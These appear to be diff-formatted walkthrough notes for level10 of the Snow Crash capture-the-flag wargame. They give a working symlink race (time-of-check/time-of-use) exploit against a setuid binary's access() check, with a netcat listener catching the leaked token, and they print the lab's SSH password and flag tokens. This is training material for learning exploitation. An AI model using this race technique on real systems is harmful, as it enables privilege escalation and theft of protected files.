@@ -1,0 +1,57 @@
++ ---- 🔻 Analyze ----
+|
+|   ./level10 token http://localhost
+|   ltrace ./level10 token http://localhost
+|   👉 access("token", 4)
+|   man 2 access
+|   👉 NOTES 🌟 Warning:  Using  access() ...
+|
+
+
++ ---- 🔻 Network ----
+|
+|   🌟 https://ru.wikipedia.org/wiki/Netcat
+|   nc -lk 6969 > /tmp/output &
+|
+|   curl http://localhost:6969
+|   ctrl+c
+|   👉 cat /tmp/output
+|
+|   echo token_test > /tmp/foo
+|   ./level10 /tmp/foo 127.0.0.1
+|   👉 cat /tmp/output
+|   kill %1
+|
+
+
++ ---- 🔻 Before hack ----
+|
+|   echo token_test > /tmp/foo
+|   ln -sf /tmp/foo /tmp/sym
+|   ls -la /tmp/sym
+|
+|   ln -sf /home/user/level10/token /tmp/sym
+|   ls -la /tmp/sym
+|
+|   🌟 python_one_line src: https://stackoverflow.com/a/35651859
+|   python -c $'import os\nimport time\nwhile True:\n\tprint("ok")\n\ttime.sleep(1)\n'
+|
+
+
++ ---- 🔻 Hack ----
+|
+|   ssh level10@$SNOW_CRASH_IP -p 4242
+|   └ s5cAJpM8ev6XHw998pRWG728z
+|   echo token_test > /tmp/foo
+|   rm -f /tmp/output; nc -lk 6969 > /tmp/output &
+|   👉 [1] xxxxx
+|   python -c $'import os\nwhile True:\n\tos.system("ln -sf {} {}".format("/tmp/foo", "/tmp/sym"))\n\tos.system("ln -sf {} {}".format("/home/user/level10/token", "/tmp/sym"))' &
+|   👉 [2] xxxxx
+|   python -c $'import os\nfor _ in range(100):\n\tos.system("./level10 /tmp/sym 127.0.0.1")'; cat /tmp/output
+|   kill %1; kill %2
+|   👉 woupa2yuojeeaaed06riuj63c
+|   su flag10
+|   └ woupa2yuojeeaaed06riuj63c
+|   getflag
+|   👉 Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+|
